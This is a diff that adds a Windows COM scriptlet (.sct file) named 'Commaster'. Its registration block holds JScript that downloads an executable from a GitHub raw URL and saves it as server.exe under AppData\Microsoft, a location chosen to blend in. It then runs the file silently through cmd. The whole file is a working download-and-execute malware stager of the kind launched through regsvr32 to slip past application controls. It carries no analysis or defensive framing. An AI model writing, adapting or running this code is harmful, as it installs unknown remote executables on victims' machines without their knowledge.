@@ -1,0 +1,37 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Com"
+    progid="Commaster"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEE31576}"
+    >
+    <script language="JScript">
+        <![CDATA[
+var Source = "https://raw.githubusercontent.com/whattheshitname/jusettest/master/Serveryy.exe";
+var Target = new ActiveXObject("WScript.Shell").SpecialFolders("AppData") + "\\Microsoft\\server.exe";
+var Object = new ActiveXObject('MSXML2.XMLHTTP');
+Object.Open('GET', Source, false);
+Object.Send();
+if (Object.Status == 200) {
+	var Stream = new ActiveXObject('ADODB.Stream');
+
+	Stream.Open();
+	Stream.Type = 1;
+	Stream.Write(Object.ResponseBody);
+	Stream.Position = 0;
+	var File = new ActiveXObject('Scripting.FileSystemObject');
+	Stream.SaveToFile(Target, 2);
+	Stream.Close();
+	new ActiveXObject("WScript.Shell").Run("cmd /c " + Target, 0, true);
+}
+        ]]>
+</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+
+</scriptlet>
